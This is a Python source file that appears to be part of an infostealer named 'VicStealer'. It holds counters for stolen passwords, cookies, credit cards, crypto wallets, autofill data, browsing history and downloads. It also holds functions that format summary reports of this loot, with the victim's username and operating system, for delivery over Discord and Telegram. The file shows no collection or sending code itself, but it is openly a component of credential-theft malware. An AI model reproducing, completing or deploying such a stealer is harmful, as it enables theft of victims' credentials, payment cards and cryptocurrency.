from datetime import datetime
import platform
import getpass


ALL_CREADIT = 0
ALL_LOGIN = 0
ALL_HISTORY = 0
ALL_DOWNLOADS = 0
ALL_COOKIES = 0
ALL_WALLETS_IN_COMPUTER = 0
ALL_AUTO_FILL = 0


ASCIIArt = r"""
********************************************
*                                          *
* __      ___       _____ _             _  *
* \ \    / (_)     / ____| |           | | *
*  \ \  / / _  ___| (___ | |_ ___  __ _| | *
*   \ \/ / | |/ __|\___ \| __/ _ \/ _` | | *
*    \  /  | | (__ ____) | ||  __/ (_| | | *
*     \/   |_|\___|_____/ \__\___|\__,_|_| *
*                                          *
*                                          *
********************************************
"""


def descord_log():
    return f"""
━━━━━━━━━━━━━━━━━━
     <:Vic:1537535294289743943> VicStealer <:Vic:1537535294289743943>
━━━━━━━━━━━━━━━━━━
<:cz_dotS:1411871664802762853> User     : {getpass.getuser()}
<:cz_dotI:1411872693921382430> OS       : {platform.system()} {platform.release()} ({platform.version()})
━━━━━━━━━━━━━━━━━━
<:cz_dotS:1411871664802762853> Passwords : {ALL_LOGIN}
<:enddot10:1352054610935681034> Cookies   : {ALL_COOKIES}
<:cz_dotS:1411871664802762853>Autofill  : {ALL_AUTO_FILL}
<:enddot10:1352054610935681034> Cards     : {ALL_CREADIT}
<:cz_dotS:1411871664802762853>  Wallets   : {ALL_WALLETS_IN_COMPUTER}
<:enddot10:1352054610935681034> Downloads : {ALL_DOWNLOADS}
<:cz_dotS:1411871664802762853> History   : {ALL_HISTORY}

•<:41158timer:1472913309169619075> Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
"""

def telegram_log():
    return f"""
⚡Vic-Log⚡

💳 Credit: {ALL_CREADIT}
🔑 Password: {ALL_LOGIN}
📜 History: {ALL_HISTORY}
⬇️ Downloads: {ALL_DOWNLOADS}
🍪 Cookies: {ALL_COOKIES}
📝 Autofill: {ALL_AUTO_FILL}
👛 Wallets: {ALL_WALLETS_IN_COMPUTER}

🕓Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
"""
